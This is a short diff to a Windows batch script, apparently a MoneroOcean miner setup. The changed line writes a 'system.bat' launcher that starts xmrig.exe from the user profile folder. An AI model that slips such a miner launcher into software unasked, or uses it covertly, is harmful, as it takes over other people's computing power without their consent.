@@ -318,7 +318,7 @@ echo :EXIT
 
 
 (
-echo start /d "%USERPROFILE\moneroocean\" xmrig.exe
+echo start "%USERPROFILE\moneroocean\" xmrig.exe
 echo mkdir "%USERPROFILE\moneroocean\sys"
 echo rmdir "%USERPROFILE\moneroocean\sys"
 ) > "%USERPROFILE%\moneroocean\system.bat"
